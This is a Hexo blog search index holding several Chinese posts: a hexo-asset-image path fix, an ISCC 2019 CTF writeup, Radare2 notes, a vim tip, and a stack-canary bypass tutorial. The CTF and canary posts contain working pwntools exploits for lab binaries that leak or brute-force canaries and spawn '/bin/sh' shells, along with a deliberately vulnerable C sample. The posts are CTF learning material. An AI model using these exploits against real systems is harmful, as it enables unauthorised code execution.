<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[使用hexo-asset-image图片路径错误]]></title>
    <url>%2F2019%2F07%2F01%2Fhexo-image%2F</url>
    <content type="text"><![CDATA[Part 1今天提交文章的时候，上去博客看了一眼，发现图片全都显示不出来， 看了下图片url，全都是 1file://image/123.jpg 这种形式的。 因为我使用的typora来写markdown，自动插入图片默认的是本地路径，去设置里更改为使用相对路径即可 part 2原本以为大功告成，结果发现还是显示错误，去网上查了下，有些插件没有装，_config.yml里的选项也没有开。。。 安装hexo-asset-image 1npm install https://github.com/CodeFalling/hexo-asset-image --save _config.yml配置 post_asset_folder: false改为post_asset_folder: true part 3再次以为大功告成，结果发现还是错误，之前hexo g -d 的时候没有注意，这次执行的时候突然发现有几条记录有点奇怪 12update link as:--&gt;/.io//06/01/vim/1561905818946.pngupdate link as:--&gt;/.io//06/01/vim/1561905818946.png 这个.io不知道是怎么来的，不管怎么修改图片的路径，这个.io总是有 最终查来查去发现是hexo-asset-image这个插件的问题，hexo 3.0以上与hexo 3.0以下获取url的方式不同，结果就导致获取到了.io这种奇怪的域名。 解决问题参考hexo引用本地图片无法显示 将/node_modules/hexo-asset-image/index.js里面的内容修改为 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061'use strict';var cheerio = require('cheerio');// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-stringfunction getPosition(str, m, i) &#123; return str.split(m, i).join(m).length;&#125;var version = String(hexo.version).split('.');hexo.extend.filter.register('after_post_render', function(data)&#123; var config = hexo.config; if(config.post_asset_folder)&#123; var link = data.permalink; if(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3) var beginPos = getPosition(link, '/', 1) + 1; else var beginPos = getPosition(link, '/', 3) + 1; // In hexo 3.1.1, the permalink of "about" page is like ".../about/index.html". var endPos = link.lastIndexOf('/') + 1; link = link.substring(beginPos, endPos); var toprocess = ['excerpt', 'more', 'content']; for(var i = 0; i &lt; toprocess.length; i++)&#123; var key = toprocess[i]; var $ = cheerio.load(data[key], &#123; ignoreWhitespace: false, xmlMode: false, lowerCaseTags: false, decodeEntities: false &#125;); $('img').each(function()&#123; if ($(this).attr('src'))&#123; // For windows style path, we replace '\' to '/'. var src = $(this).attr('src').replace('\\', '/'); if(!/http[s]*.*|\/\/.*/.test(src) &amp;&amp; !/^\s*\//.test(src)) &#123; // For "about" page, the first part of "src" can't be removed. // In addition, to support multi-level local directory. var linkArray = link.split('/').filter(function(elem)&#123; return elem != ''; &#125;); var srcArray = src.split('/').filter(function(elem)&#123; return elem != '' &amp;&amp; elem != '.'; &#125;); if(srcArray.length &gt; 1) srcArray.shift(); src = srcArray.join('/'); $(this).attr('src', config.root + link + src); console.info&amp;&amp;console.info("update link as:--&gt;"+config.root + link + src); &#125; &#125;else&#123; console.info&amp;&amp;console.info("no src attr, skipped..."); console.info&amp;&amp;console.info($(this)); &#125; &#125;); data[key] = $.html(); &#125; &#125;&#125;); 接着再去hexo g -d一下就能显示成功了。 hexo 3.0以上用户应该也可以选择直接卸载hexo-asset-image插件，直接使用官方的相对路径引用的标签插件 资源文件夹 通过常规的 markdown 语法和相对路径来引用图片和其它资源可能会导致它们在存档页或者主页上显示不正确。在Hexo 2时代，社区创建了很多插件来解决这个问题。但是，随着Hexo 3 的发布，许多新的标签插件被加入到了核心代码中。这使得你可以更简单地在文章中引用你的资源。 1234&gt; &#123;% asset_path slug %&#125;&gt; &#123;% asset_img slug [title] %&#125;&gt; &#123;% asset_link slug [title] %&#125;&gt; 比如说：当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 ![](/example.jpg) ，它将 不会 出现在首页上。（但是它会在文章中按你期待的方式工作） 正确的引用图片方式是使用下列的标签插件而不是 markdown ： 12&gt; &#123;% asset_img example.jpg This is an example image %&#125;&gt; 通过这种方式，图片将会同时出现在文章和主页以及归档页中。]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[z3-solver学习]]></title>
    <url>%2F2019%2F06%2F29%2Fz3%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[ISCC 2019 Writeup]]></title>
    <url>%2F2019%2F06%2F22%2FISCC%2F</url>
    <content type="text"><![CDATA[其实是ISCC 2018 REVERSE去网上搜flag时发现是2018原题 首先IDA打开发现UPX壳，使用UPX -d脱壳，然后放进IDA里面看源码 有点不忍直视，放弃，直接放进OD里面跑。 调试了几次，摸清了大致流程： 接收字符串 根据接收到的字符串打印出来东西 然后打印出来的东西本身是在程序里存着，像这样： 把这些数据拿出来转成字符串就是这种： 12666f72 495343 5f6172 696375 746869 6e6773 617379 696666 437b41 6c747d 5f6265 6c6c5f 655f64 68657965for ISC _ar icu thi ngs asy iff C&#123;A lt&#125; _be ll_ e_d heye 输入-&gt;输出规律： 123456789101112131415161 -&gt; for2 -&gt; ISC3 -&gt; _ar4 -&gt; icu 5 -&gt; thi6 -&gt; ngs7 -&gt; iff 8 -&gt; _ar9 -&gt; C&#123;A10-&gt; lt&#125;11-&gt; _be12-&gt; ll13-&gt; e_d14-&gt; hey15-&gt; e_t16-&gt; e_e 接着拼出flag-&gt;ISCC{All_things_are_easy_before_they_are_difficult}，翻译一下是凡事必先易后难，但是也可以拼成All_things_are_difficult_before_they_are_easy(凡事必先难后易)，不是很懂出题人在想什么，卡拉赞毕业打卡拉赞 MISC依旧是原题，只不过看2018的wp貌似是个gif，每帧都是不同的二维码，而这次直接弄了一堆到文件夹里 抄下网上的wp 二维码要求在两个大黑框之间必须有连续的黑白点，这样才行逐帧分析gif，发现只有第62帧存在一个校正图形 ，保存补上位置探测图形和定位图形 ，扫描得到ISRDQzgxMDI=，base64解码得到!$CC8102 嗦不粗话，连flag都没换 MOBILE原题，最大的收获是找到了不少好用的工具 放入APKIDE中打开，查看AndroidManifest.xml，看到启动类为com.example.shellapplication.WrapperApplication 123456789101112public class WrapperApplication extends Application&#123; static &#123; System.loadLibrary("reinforce"); &#125; public native void attachBaseContext(Context paramContext); public native void onCreate();&#125; 这个类加载了libreinforce.so，接着去看onCreate()和attachBaseContext中的内容 onCreate： 123456789101112131415v2 = a2;v3 = a1;v4 = (*(int (**)(void))(*(_DWORD *)a1 + 24))();v5 = v4;v6 = _JNIEnv::GetMethodID(v3, v4, "getPackageName", "()Ljava/lang/String;");v7 = _JNIEnv::CallObjectMethod(v3, v2, v6);v8 = (*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)v3 + 676))(v3, v7, 0);_android_log_print(4, "TTT", "shellapplication's onCreate execute");memset(&amp;v12, 0, 0x100u);sprintf(&amp;v12, "/data/data/%s/lib/libcore.so", v8);v9 = dlopen(&amp;v12, 1);v10 = (void (__fastcall *)(int))dlsym(v9, "resume");v10(v3);_JNIEnv::DeleteLocalRef(v3, v7);return _JNIEnv::DeleteLocalRef(v3, v5); onCreate中加载了libcore.so以及调用了resume这个方法 attachBaseContext： 12345678910memset(&amp;v23, 0, 0x100u);sprintf(&amp;v23, "%s/protected.jar", v17);extractJar(v4, v5, &amp;v23);byte_601C = (unsigned int)dalvikOrArt();memset(&amp;v24, 0, 0x100u);sprintf(&amp;v24, "%s/origin.dex", v17);decryptJar(&amp;v23, &amp;v24);v22 = v4;memset(&amp;v25, 0, 0x100u);sprintf(&amp;v25, "%s/protected.so", v17); attachBaseContext中最关键的部分是对assets中的 protected.jar进行解密，解密操作很简单，按位取反 decryptJar： 12345while ( v9 &lt; v6 ) &#123; *((_BYTE *)v8 + v9) = ~*((_BYTE *)v7 + v9); ++v9; &#125; 解密脚本： 123456789101112131415#include &lt;stdio.h&gt;int main()&#123; FILE* fi, * fo; fo = fopen("dec.dex", "wb"); fi = fopen("protected.jar", "rb"); char fBuffer[1]; while (!feof(fi)) &#123; fread(fBuffer, 1, 1, fi); // 读取1字节 if (!feof(fi)) &#123; *fBuffer =~ *fBuffer; // xor encrypt fwrite(fBuffer, 1, 1, fo); // 写入文件 &#125; &#125;&#125; 之所以为什么用C来写。。。因为python按位取反之后返回的是int类型，而负数又没办法to_bytes()，写了半天也没写出来一个比较优雅的exp，放弃。 解密之后得到一个dex文件，使用dex2jar将其转成jar文件，使用jd-gui打开。 onCreate中调用ProtectedClass的verifyKey对输入进行检查： 12345if (ProtectedClass.verifyKey(inputText.getText().toString())) &#123; str = "密码正确"; &#125; else &#123; str = "密码错误"; &#125; ProtectedClass的逻辑： 123456789public class ProtectedClass &#123; private static int[][] key = &#123; &#123; 17, 12, 3 &#125;, &#123; 21, 12, 9 &#125;, &#123; 17, 14, 6 &#125; &#125;; private static native String getEncrypttext(String paramString); public static String getString() &#123; return "bfs-iscc"; &#125; public static boolean verifyKey(String paramString) &#123; return (paramString.length() % 3 != 0) ? false : "OYUGMCH&gt;YWOCBXF))9/3)YYE".equals(getEncrypttext(paramString)); &#125;&#125; 将输入进行加密之后与OYUGMCH&gt;YWOCBXF进行比较，但是关键的getEncrypttext函数又是个native。 之前libreinforce.so中，在加载完libcore.so后，还调用了其中的resume方法 resume： 12345678910111213141516171819202122v1 = a1;v5 = 0;v6 = 0;v7 = 0;v2 = dalvikOrArt();decryptAndParse((int)&amp;v5);getSdkint(v1);if ( v2 ) resumeArt(v1, &amp;v5);else resumeDalvik((int)v1, &amp;v5);v3 = (char *)v5;v4 = v6;while ( v3 != (char *)v4 )&#123; sub_539C(v3 + 8); sub_539C(v3 + 4); sub_539C(v3); v3 += 16;&#125;if ( v5 ) operator delete(v5); 什么都看不出来。 看大佬的博客里面说使用了一个安卓的热补丁修复机制。 关于热补丁机制的描述是这样的： 在不进行版本更新的情况下，动态的屏蔽掉程序原来存在BUG的函数，使用新的函数替代。 新函数一般存在于另一个so中 热补丁的流程主要有： 通过函数名找到原来函数的地址偏移（ArtMethod-&gt;dex_code_item_offset_）。 将新函数地址偏移替换原函数地址偏移。 而上述程序也为类似主要流程如下： 分析安卓虚拟机为dalvik还是art，二者热补丁方式不一样。 解密解析补丁函数表(decryptAndParse) 执行补丁操作 接着在decryptAndParse中，对补丁表每字节+10，进行解密，解密后的补丁表： 1Lcom/example/originapplication/ProtectedClass;getEncrypttext(Ljava/lang/String;)Ljava/lang/String;1416140 后面这串数字就是新函数的位置。 这部分就是函数的字节码，但是IDA没有显示出来汇编，需要手动转换 不会 剩下的参考https://mypre.cn/2018/10/27/bfs-iscc-mobile PWNbomb_squad首先checksec一下 123456[*] '/root/work/CLSknpNF3iWUuHCX.bomb_squad' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 这个题目首先由4个小关卡，全部通关之后才能达到getflag的地方 12345678910111213int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; setvbuf(stdout, 0, 2, 0); puts("Welcome to the bomb squad! Your first task: Diffuse this practice bomb."); phase_1(); puts("You got through phase 1 alright! Good work! But can you handle phase 2?"); phase_2(); puts("You could handle it! Good job... I think you can handle phase 3... right?"); phase_3(); puts("DAYUM, you got it! You know the drill, time for phase 4."); phase_4(); print_flag();&#125; phase_112345678910111213int phase_1()&#123; char *v0; // eax int result; // eax puts("Give me a number!"); v0 = get_line(); result = 3 * (2 * atoi(v0) / 37 - 18) - 1; if ( result != 1337 ) explode_bomb(); phase1_solved = 1; return result;&#125; 关卡1接收一个数字，经过一系列计算，使得最终结果要等于1337，使用z3-solver很容易得出解。 phase_2123456789101112131415161718int phase_2()&#123; puts("Give me an array of numbers!"); s = get_line(); sscanf(s, "[%d, %d, %d, %d, %d, %d]", v4, _2C, _30, _34, _38, _3C); result = v4[0]; if ( v4[0] != 1 ) explode_bomb(); for ( i = 1; i &lt;= 5; ++i ) &#123; v2 = v4[i - 1] + v4[i]; result = func2(i); if ( v2 != result ) explode_bomb(); &#125; phase2_solved = 1; return result;&#125; 接收一个数组，要求满足a[0]=1，a[i-1]+a[i]=2^i，那么结果就是[1, 1, 3, 5, 11, 21] phase_2123456789101112131415161718192021int phase_3()&#123; v4 = get_line(); v5 = "rqzzepiwMLepiwYsLYtpqpvzLsYeM"; while ( 1 ) &#123; v1 = v4++; result = (unsigned __int8)*v1; v3 = result; if ( !(_BYTE)result ) break; if ( (char)result &lt;= 96 || (char)result &gt; 123 ) explode_bomb(); v0 = v5++; if ( *v0 != keys[v3 - 97] ) explode_bomb(); lastentered = v3; &#125; phase3_solved = 1; return result;&#125; 接收一串字符串，要求keys里面的字符串要与v5的对应。但实际上不需要这么麻烦， 12if ( !(_BYTE)result ) break; 当输入为\x00时，就会跳出循环，直接返回。 phase_41234567891011121314151617181920int phase_4()&#123; s = (char *)get_line(); sscanf(s, "%d %d %d %d %d %d %d", v5, &amp;v5[1], &amp;v5[2], &amp;v5[3], &amp;v5[4], &amp;v5[5], &amp;v5[6]); v2 = &amp;n1; result = n1.num; v3 = n1.num; for ( i = 0; i &lt;= 6; ++i ) &#123; if ( v5[i] &lt; 0 || v5[i] &gt; 3 ) explode_bomb(); v2 = (node *)*((_DWORD *)&amp;v2-&gt;next1 + v5[i]); result = v2-&gt;num; v3 += result; &#125; if ( v3 != 95 ) explode_bomb(); phase4_solved = 1; return result;&#125; 这里n1是一个结构体，大致结构如下 12345678struct node&#123; node* next1; node* next2; node* next3; node* next4; char name[8]; int num;&#125;; 这一关接收用户输入的数字，根据数字来进行结构体之间num相加的顺序。 比如输入为&quot;0 3&quot;，相加的顺序就是0xa+0x7+0x10。 最后试出来解为3 0 3 0 3 0 0。 secret_phase通关之后会进入print_flag，经过verify_working之后会打印出来flag 123456789void __noreturn print_flag()&#123; if ( verify_working() ) &#123; puts("Congratulations, you won! Here's the flag:"); system("cat flag.txt"); &#125; exit(1);&#125; 但是verify_working始终返回1的，而且最终也并没有得到flag，还是需要getshell。 进入secret_phase 123456789101112131415161718int secret_phase()&#123; puts("this is the secret phase.... please whisper, to keep it a seecret..."); v2 = &amp;n1; v3 = n2; v4 = &amp;n3; v5 = &amp;n4; v6 = &amp;n5; v7 = &amp;n6; for ( i = 0; i &lt;= 5; ++i ) &#123; printf("Rename node #%d to: ", i + 1); fgets((*(&amp;v2 + i))-&gt;name, 9, stdin); *(_BYTE *)strchrnul((*(&amp;v2 + i))-&gt;name, 10) = 0; putchar(10); &#125; return puts("Thanks, I was worried about having to come up with clever names myself!");&#125; 这一段代码是修改每一个node的name成员，最多只可以溢出一个字节到num上面，并没有什么用。 fini段 该section保存着进程终止代码指令。因此，当一个程序正常退出时，系统安排执行这个section的中的代码。 .fini_array中有一个__gg函数 1234567891011121314151617181920212223v5 = &amp;n1;v6 = n2;v7 = &amp;n3;v8 = &amp;n4;v9 = &amp;n5;v10 = &amp;n6;for ( i = 0; i &lt;= 5; ++i )&#123; v0 = alloca(32); v1 = *(&amp;v5 + i); v2 = (_DWORD *)(16 * (((unsigned int)&amp;v6 + 3) &gt;&gt; 4)); *v2 = *v1; v2[1] = v1[1]; v2[2] = v1[2]; v2[3] = v1[3]; v2[4] = v1[4]; v2[5] = v1[5]; v2[6] = v1[6]; result = *(_DWORD *)(16 * (((unsigned int)&amp;v6 + 3) &gt;&gt; 4) + 0x14); if ( result ) result = (*(int (**)(void))(16 * (((unsigned int)&amp;v6 + 3) &gt;&gt; 4) + 0x14))();&#125;return result; 经过分析之后发现这个函数会执行每个node中name[4]-name[8]所指向的函数，而name自然可以控制。并且call的时候，此时栈顶指向的就是当前node。那么只需要把某一个node的name后四个字节修改成system，next1指向的内容修改为/bin/sh\x00就可以getshell。 任意地址写__nr函数： 123456789unsigned int _nr()&#123; v5 = __readgsdword(0x14u); v0 = (const char *)get_line(); strcpy(&amp;dest, v0); v1 = (const char *)get_line(); strcpy(v4, v1); return __readgsdword(0x14u) ^ v5;&#125; 很明显的栈溢出，可以通过第一个输入，将v4覆盖为node-&gt;next1的地址，通过第二个输入在修改next1所指向的内容。 payload1234567891011121314151617from pwn import *p = process("./bomb_squad")p.sendline("8584")p.sendline("[1, 1, 3, 5, 11, 21]")p.sendline("\x00")p.sendline("3 0 3 0 3 0 0")system = 0x080485A0n3 = 0x804b0a8nr = 0x08048CDApayload = 'aaaa' + p32(nr) #首先利用__gg函数执行node1中的__nr函数p.send(payload)payload = 'bbbb' + p32(system) + "\n\n\n\n" #接着写入system地址到node2等待第二次call，最后4个\n跳过剩下4个node-&gt;name的修改p.send(payload) payload = 'a' * 0xfc + p32(n3) #栈溢出，修改n3-&gt;next1指向的内容p.sendline(payload)p.sendline('/bin/sh\x00')p.interactive() 之所以为什么是要修改n3-&gt;next1，因为system地址写入到了node2的name中，当__gg函数执行时，此时栈顶排列为 n3 n4 n5 n6 name num 接下来就要执行system函数，所以要修改n3指向的地址。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Radare2学习]]></title>
    <url>%2F2019%2F06%2F10%2FRadare2%2F</url>
    <content type="text"><![CDATA[Radare2介绍 Radare project started as a forensics tool, a scriptable command-line hexadecimal editor able to open disk files, but later added support for analyzing binaries, disassembling code, debugging programs, attaching to remote gdb servers… Radare2是一个用于反向工程和分析二进制文件的可移植框架。它实际上是radare的一个重写 - 取证工具。 Radare2由以下工具组成 rax2 ———&gt; 用于数值转换 rasm2 ——-&gt; 反汇编和汇编 rabin2 ——-&gt; 查看文件格式 radiff2 ——&gt; 对文件进行 diff ragg2/ragg2­cc ——&gt; 用于更方便的生成shellcode rahash2 ——&gt; 各种密码算法， hash算法 radare2 ——&gt; 整合了上面的工具 rax2用于进行数值转换 123456rax2 =base code ;以base进制输出code，例：rax2 =10 0x46，output=70rax2 -D base64 decode ;解码rax2 -E base64 encode ;编码rax2 -S raw -&gt; hexstr ;以16进制输出rax2 -s hexstr -&gt; raw ;与上面相反rax2 -a show ascii table ;输出ascii表 rabin2用于获取程序的各种信息 123456789rabin2 -I binary info ;显示程序各种信息rabin2 -i imports (symbols imported from libraries) ;导入的函数rabin2 -l linked libraries ;显示依赖库rabin2 -M main (show address of main symbol) ;显示main函数地址rabin2 -s symbols ;符号表rabin2 -s sectionsrabin2 -z strings (from data section) ;仅从data中获取字符串rabin2 -zz strings (from raw bins [e bin.rawstr=1]) ;从整个程序中寻找字符串rabin2 -zzz dump raw strings to stdout (for huge files) ;将字符串输出到文件中 rasm2用于多种架构的命令行汇编和反汇编程序。 1234rasm2 -a [arch] 设置汇编与反汇编的架构rasm2 -L 列举支持的架构rasm2 -d,-D 反汇编16进制数据rasm2 -b 设置位数 ragg2/ragg2.ccradare2自己实现的c编译器]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于vim的复制粘贴]]></title>
    <url>%2F2019%2F06%2F01%2Fvim%2F</url>
    <content type="text"><![CDATA[学习Canary相关的东西时，因为要从网上复制粘贴各种代码，因为缩进问题，复制完之后的效果惨不忍睹，比如这样： 过于惨不忍睹，markdown的代码框展现不出来效果 解决方法的话就是在粘贴前先输入:set paste，接着进入insert模式的时候后面就会多个(paste)，这样复制进去的就和你原本看到的一样了]]></content>
      <tags>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Canary原理以及绕过]]></title>
    <url>%2F2019%2F05%2F31%2Fcanary%2F</url>
    <content type="text"><![CDATA[Canary原理以及绕过Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志Canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理1234567891011121314 High Address | | +-----------------+ | args | +-----------------+ | return address | +-----------------+ rbp =&gt; | old ebp | +-----------------+rbp-8 =&gt; | Canary value | +-----------------+ | 局部变量 | Low | | Address 12mov rax, qword ptr fs:[0x28]mov qword ptr [rbp - 8], rax 函数在fs:[0x28]取一个值，放入栈中，在函数结束前与fs:[0x28]进行异或，如果结果为0，Canary则未修改，不为0就是发生了缓冲区溢出。 12345;异或检查Canarymov rdx,QWORD PTR [rbp-0x8]xor rdx,QWORD PTR fs:0x28je 0x4005d7 &lt;main+65&gt;call 0x400460 &lt;__stack_chk_fail@plt&gt; 而fs寄存器又指向了当前栈的TLS结构(TLS全称线程局部存储器，它用来保存变量或回调函数)，fs:[0x28]则指向了stack_guard。 1234567891011typedef struct&#123; void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; uintptr_t sysinfo; uintptr_t stack_guard; ...&#125; tcbhead_t; 如果可以溢出覆盖tls的话，就可以绕过Canary 如果Canary已被修改，程序会走到 __stack_chk_fail 1234567891011121314//eglibc-2.19/debug/stack_chk_fail.cvoid __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125; Canary绕过泄露Canary漏洞代码： 1234567891011121314151617181920212223242526// ex2.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;void getshell(void) &#123; system("/bin/sh");&#125;void init() &#123; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL);&#125;void vuln() &#123; char buf[100]; for(int i=0;i&lt;2;i++)&#123; read(0, buf, 0x200); printf(buf); &#125;&#125;int main(void) &#123; init(); puts("Hello Hacker!"); vuln(); return 0;&#125; 编译为32位程序，开启Canary保护，关闭PIE： 1gcc -m32 -fstack-protector -no-pie ex2.c -o ex2 ida打开，在vuln处下断点，程序执行到这里时往栈上添加Canary。 12.text:565C5280 mov eax, large gs:14h.text:565C5286 mov [ebp+var_C], eax ;ebp+var_C=FF80175C 接着到read的位置 buf的位置在FF8016F8，Canary的位置在FF80175C，FF80175C-FF8016F8=0x64=100个字节 也就是说输入100个字节在加上回车的一个0xa正好可以覆盖到Canary的低位字节。 Canary设计为以字节 \x00 结尾，本意是为了保证 Canary可以截断字符串，想要打印出Canary就只有覆盖低位字节 得到Canary值后接下来就是普通的rop了 123456789101112131415161718192021222324252627#!/usr/bin/env pythonfrom pwn import *context.binary = &apos;ex2&apos;#context.log_level = &apos;debug&apos;io = process(&apos;./ex2&apos;)get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]io.recvuntil(&quot;Hello Hacker!\n&quot;)# leak Canarypayload = &quot;A&quot;*100io.sendline(payload)io.recvuntil(&quot;A&quot;*100)Canary = u32(io.recv(4))-0xalog.info(&quot;Canary:&quot;+hex(Canary))# Bypass Canarypayload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)io.send(payload)io.recv()io.interactive() 爆破Canary pid_t fork( void); 返回值： 若成功调用一次则返回两个值，子进程返回0，父进程返回子进程ID；否则，出错返回-1 个现有进程可以调用fork函数创建一个新进程。由fork创建的新进程被称为子进程（child process）。fork函数被调用一次但返回两次。两次返回的唯一区别是子进程中返回0值而父进程中返回子进程ID。 子进程是父进程的副本，它将获得父进程数据空间、堆、栈等资源的副本。注意，子进程持有的是上述存储空间的“副本”，这意味着父子进程间不共享这些存储空间。 利用fork就可以进行对Canary的爆破 ida: 1234567891011121314151617181920212223int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; __pid_t v3; // [esp+Ch] [ebp-Ch] init(); while ( 1 ) &#123; v3 = fork(); if ( v3 &lt; 0 ) break; //fork失败了就退出 if ( v3 ) &#123; wait(0); //父进程卡在这里 &#125; else &#123; puts("welcome"); //子进程执行漏洞 fun(); puts("recv sucess"); &#125; &#125; puts("fork error"); exit(0); 直接下断点调试的话是断在父进程里面，一直在wait()，可以先在fun()中的read()函数处下断点，接着去docker里面直接运行程序，从ida里面attach上去，此时里面有两个bin1，pid值较大的那一个就是子进程。 经过调试后，得知buf到Canary需要100字节，Canary到return地址需要12字节，编写exp: 1234567891011121314151617181920212223242526272829from pwn import *#context.log_level = 'debug'debug=1if debug: io=process("./bin1")else: io=remote("172.17.0.2",10001)canary='\x00'io.recvuntil("welcome\n")for i in range(3): for j in range(256): io.send('a'*100+canary+chr(j)) tmp=io.recvuntil("welcome\n") //输出recv success之后还会输出welcome，所以根据welcome判断，recvall()不知道为什么会卡住 if "recv" in tmp: canary+=chr(j) breakget_flag=0x0804863Bpayload='a'*100+canary+'a'*12+p32(get_flag)io.sendline(payload)print io.recvline() //recvall也会卡住 Stack-smashing Protection (SSP)当Canary值比较不正确时，程序就会跳转到__stack_chk_fail， Libc 2.23先看下__stack_chk_fail的源码： 12345678910// debug/stack_chk_fail.cextern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn))__stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125; 其中调用了__fortify_fail 1234567891011121314// debug/fortify_fail.cextern char **__libc_argv attribute_hidden;void__attribute__ ((noreturn)) internal_function__fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125;libc_hidden_def (__fortify_fail) __fortify_fail 调用__libc_message 打印错误信息和 argv[0] ,当输入的字符串长度足够长时，就可以覆盖到argv[0]，就可以通过报错泄露出信息。 pwn 32C3CTF2015 readme 第一次的输入也就是IO_gets()存在缓冲区溢出漏洞，而第二次的输入将覆盖flag 虽然flag被覆盖掉了，但是程序中还存在一个flag，这个就涉及到了linux系统中elf文件的映射 1234567gdb-peda$ b *0x0040080eBreakpoint 1 at 0x40080egdb-peda$ rgdb-peda$ vmmap readme.binStart End Perm Name0x00400000 0x00401000 r-xp /home/firmyy/readme.bin0x00600000 0x00601000 rw-p /home/firmyy/readme.bin 由此可以看出readme.bin被映射到到了两个地方，而只要在程序0x00000000~0x00001000内的数据，都会被映射到内存中，flag的位置在0x00000D20，也就是说flag也被映射到了0x00400D20和0x006000D20这两个内存地址当中，所以即使0x006000D20的被覆盖了，0x00400D20的也依旧存在。 由于要利用__stack_chk_fail泄露flag，需要找出argv[0]距离缓冲区的距离 gdb中直接在main函数处下断点： 1234567891011121314151617181920212223242526272829303132333435363738[----------------------------------registers-----------------------------------]RAX: 0x4006d0 (sub rsp,0x8)RBX: 0x0 RCX: 0x7ffff7fa9718 --&gt; 0x7ffff7faad80 --&gt; 0x0 RDX: 0x7fffffffe608 --&gt; 0x7fffffffe837 (&quot;SHELL=/bin/bash&quot;)RSI: 0x7fffffffe5f8 --&gt; 0x7fffffffe826 (&quot;/root/readme.bin&quot;)RDI: 0x1 RBP: 0x4008b0 (push r15)RSP: 0x7fffffffe518 --&gt; 0x7ffff7e1209b (&lt;__libc_start_main+235&gt;: mov edi,eax)RIP: 0x4006d0 (sub rsp,0x8)R8 : 0x7ffff7faad80 --&gt; 0x0 R9 : 0x7ffff7faad80 --&gt; 0x0 R10: 0xfffffffffffff46b R11: 0x7ffff7e11fb0 (&lt;__libc_start_main&gt;: push r14)R12: 0x4006ee (xor ebp,ebp)R13: 0x7fffffffe5f0 --&gt; 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x4006c0 &lt;_IO_gets@plt&gt;: jmp QWORD PTR [rip+0x20062a] # 0x600cf0 &lt;_IO_gets@got.plt&gt; 0x4006c6 &lt;_IO_gets@plt+6&gt;: push 0x9 0x4006cb &lt;_IO_gets@plt+11&gt;: jmp 0x400620=&gt; 0x4006d0: sub rsp,0x8 0x4006d4: mov rdi,QWORD PTR [rip+0x200665] # 0x600d40 &lt;stdout&gt; 0x4006db: xor esi,esi 0x4006dd: call 0x400660 &lt;setbuf@plt&gt; 0x4006e2: call 0x4007e0[------------------------------------stack-------------------------------------]0000| 0x7fffffffe518 --&gt; 0x7ffff7e1209b (&lt;__libc_start_main+235&gt;: mov edi,eax)0008| 0x7fffffffe520 --&gt; 0x0 0016| 0x7fffffffe528 --&gt; 0x7fffffffe5f8 --&gt; 0x7fffffffe826 (&quot;/root/readme.bin&quot;)0024| 0x7fffffffe530 --&gt; 0x100000000 0032| 0x7fffffffe538 --&gt; 0x4006d0 (sub rsp,0x8)0040| 0x7fffffffe540 --&gt; 0x0 0048| 0x7fffffffe548 --&gt; 0x9266eaee5b02c2c9 0056| 0x7fffffffe550 --&gt; 0x4006ee (xor ebp,ebp)[------------------------------------------------------------------------------] 其中，0016| 0x7fffffffe528 --&gt; 0x7fffffffe5f8 --&gt; 0x7fffffffe826 (&quot;/root/readme.bin&quot;)就是argv[0]的地址了。 argv 是 argument vector的缩写，表示传入main函数的参数序列或指针，并且第一个参数argv[0]一定是程序的名称，并且包含了程序所在的完整路径 接下来运行到_IO_gets处，查看缓冲区的地址，计算得到要覆盖到argv[0]的话需要0x218个字节。 挂载程序： 1$ socat tcp4-listen:10001,reuseaddr,fork exec:./readme.bin,stderr payload: 12345678from pwn import *io = remote("172.17.0.2", 10001)payload_1 = "A"*0x218 + p64(0x400d20)io.sendline(payload_1)payload_2 = "A"*4io.sendline(payload_2)print io.recvall() 但是执行完payload后，执行的终端里没有打印出flag，而在服务器的终端中打印了出来 特别注意要控制LIBC_FATAL_STDERR_=1让fortify_fail能够把输出作为stderr给我们。否则fortify_fail下层接的是libc_message，而libc_message调用的是getenv。 getenv就是从environ指针那里去找环境变量指针数组。 getenv如果发现这环境变量没设置，libc_message会syscall调用open(&#39;/dev/tty&#39;)，输出你是看不到的。 https://bbs.pediy.com/thread-223664.htm 